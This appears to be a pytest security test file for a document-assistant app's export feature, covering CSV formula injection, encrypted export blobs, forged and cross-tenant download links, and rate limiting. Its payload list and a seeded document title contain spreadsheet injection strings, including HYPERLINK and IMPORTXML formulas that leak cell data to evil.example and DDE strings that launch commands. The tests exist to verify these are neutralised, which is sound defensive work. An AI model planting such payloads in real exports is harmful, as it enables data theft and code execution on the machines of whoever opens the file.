"""Export security: CSV formula injection, encryption at rest, blob binding, link forgery."""

from __future__ import annotations

import uuid
from datetime import UTC, date, datetime, timedelta
from pathlib import Path
from typing import Any
from urllib.parse import parse_qs, urlsplit

import pytest
from sqlalchemy import delete, update

from docassist.db.models import User, UserDepartment
from docassist.db.session import DbContext
from docassist.intelligence.exports import FORMULA_PREFIXES, build_link_token
from tests.conftest import login
from tests.helpers_intelligence import (
    FieldSpec,
    installed_storage,
    run_export_job,
    seed_document,
    tenant,
)
from tests.integration.test_exports_api import export_row, read_csv, ready_export, set_export

pytestmark = [pytest.mark.db]

PAYLOADS = [
    '=HYPERLINK("http://evil.example/?leak="&A1,"Click")',
    "+cmd|' /C calc'!A0",
    "-2+3+cmd|' /C calc'!A0",
    "@SUM(1+1)*cmd|' /C calc'!A0",
    "\t=1+1",
    chr(0xFF1D) + "1+1",
    chr(0x200B) + "=1+1",
    " =1+1",
]


@pytest.fixture(autouse=True)
def storage(container: Any) -> Any:
    with installed_storage(container) as installed:
        yield installed


async def test_csv_export_neutralises_formula_injection(client, factory, container) -> None:
    t = await tenant(factory)
    await seed_document(
        container,
        t.org,
        t.manager.id,
        title='=IMPORTXML(CONCAT("http://evil.example/?",A1),"//a")',
        fields={
            0: [
                FieldSpec(f"field_{i}", value_text=payload, evidence=payload, chunk=0)
                for i, payload in enumerate(PAYLOADS)
            ]
        },
    )
    headers = await login(client, t.manager)
    export_id = await ready_export(client, container, headers, "extracted_fields")
    content = (await client.get(f"/api/v1/exports/{export_id}/download", headers=headers)).content
    rows = read_csv(content)
    assert len(rows) == 1 + len(PAYLOADS)
    for row in rows[1:]:
        for cell in row:
            assert not cell.startswith(FORMULA_PREFIXES), cell
            assert not cell.lstrip(" ").startswith(FORMULA_PREFIXES), cell
        assert row[1].startswith("'=IMPORTXML")  # document title
        assert row[5].startswith("'") and row[12].startswith("'")  # value and evidence
    assert chr(0x200B) not in content.decode("utf-8-sig")


async def test_export_blob_is_encrypted_and_bound_to_its_record(client, factory, container) -> None:
    t = await tenant(factory)
    marker = "PLAINTEXT-MARKER-" + uuid.uuid4().hex
    await seed_document(
        container, t.org, t.manager.id, fields={0: [FieldSpec("note", value_text=marker, chunk=0)]}
    )
    headers = await login(client, t.manager)
    first = await ready_export(client, container, headers, "extracted_fields")
    second = await ready_export(client, container, headers, "extracted_fields")
    row = await export_row(container, t.org, first)
    assert row.storage_key is not None
    blob = Path(container.settings.storage.root).resolve().joinpath(*row.storage_key.split("/"))
    raw = blob.read_bytes()
    assert raw.startswith(b"DAENC1") and marker.encode() not in raw
    # pointing export #2 at export #1's blob fails authentication instead of leaking it
    await set_export(container, t.org, second, storage_key=row.storage_key)
    swapped = await client.get(f"/api/v1/exports/{second}/download", headers=headers)
    assert swapped.status_code == 503
    assert marker not in swapped.text
    assert (
        await client.get(f"/api/v1/exports/{first}/download", headers=headers)
    ).status_code == 200


async def test_forged_and_cross_tenant_links_are_rejected(client, factory, container) -> None:
    t = await tenant(factory)
    other = await tenant(factory)
    await seed_document(container, t.org, t.manager.id)
    headers = await login(client, t.manager)
    export_id = uuid.UUID(await ready_export(client, container, headers, "extracted_fields"))
    expires = int((datetime.now(UTC) + timedelta(minutes=4)).timestamp())
    # correctly signed, but for a user of another organisation: the export is invisible there
    foreign = build_link_token(
        container.tokens,
        export_id=export_id,
        org_id=other.org,
        user_id=other.admin.id,
        expires=expires,
        counter=0,
    )
    assert (
        await client.get("/api/v1/exports/download", params={"token": foreign})
    ).status_code == 404
    # correctly signed for a colleague in the same organisation: not the creator
    colleague = build_link_token(
        container.tokens,
        export_id=export_id,
        org_id=t.org,
        user_id=t.admin.id,
        expires=expires,
        counter=0,
    )
    assert (
        await client.get("/api/v1/exports/download", params={"token": colleague})
    ).status_code == 404
    # a genuine link stops working when its user is disabled
    link = (await client.post(f"/api/v1/exports/{export_id}/link", headers=headers)).json()
    token = parse_qs(urlsplit(link["url"]).query)["token"][0]
    async with container.db.transaction(DbContext(org_id=t.org)) as session:
        await session.execute(update(User).where(User.id == t.manager.id).values(status="disabled"))
    response = await client.get("/api/v1/exports/download", params={"token": token})
    assert response.status_code == 404
    assert token not in response.text
    assert (
        await client.get("/api/v1/exports/download", params={"token": "x" * 600})
    ).status_code == 422


async def test_export_scope_follows_current_access(client, factory, container) -> None:
    """Rows are collected with the creator's access at generation time, not creation time."""
    t = await tenant(factory)
    doc = await seed_document(
        container, t.org, t.admin.id, classification="CONFIDENTIAL", department_id=t.dept,
        fields={0: [FieldSpec("expiration_date", value_date=date(2027, 1, 1), chunk=0)]},
    )  # fmt: skip
    headers = await login(client, t.manager)
    response = await client.post(
        "/api/v1/exports", json={"kind": "extracted_fields", "params": {}}, headers=headers
    )
    export_id = response.json()["id"]
    # the manager leaves the department before the worker runs
    async with container.db.transaction(DbContext(org_id=t.org)) as session:
        await session.execute(delete(UserDepartment).where(UserDepartment.user_id == t.manager.id))
    await run_export_job(container, uuid.UUID(export_id))
    rows = read_csv(
        (await client.get(f"/api/v1/exports/{export_id}/download", headers=headers)).content
    )
    assert rows[1:] == [] and str(doc.id) not in str(rows)


async def test_link_redemption_is_rate_limited_per_client(client, factory, container) -> None:
    from tests.helpers_intelligence import replaced_attribute

    rules = container.settings.rate_limit
    tight = rules.model_copy(
        update={
            "api_per_user": rules.api_per_user.model_copy(
                update={"requests": 1, "per_seconds": 3_600}
            )
        }
    )
    with replaced_attribute(
        container, "settings", container.settings.model_copy(update={"rate_limit": tight})
    ):
        statuses = [
            (await client.get("/api/v1/exports/download", params={"token": "v1.bogus"})).status_code
            for _ in range(3)
        ]
    assert statuses[0] == 404 and statuses[-1] == 429
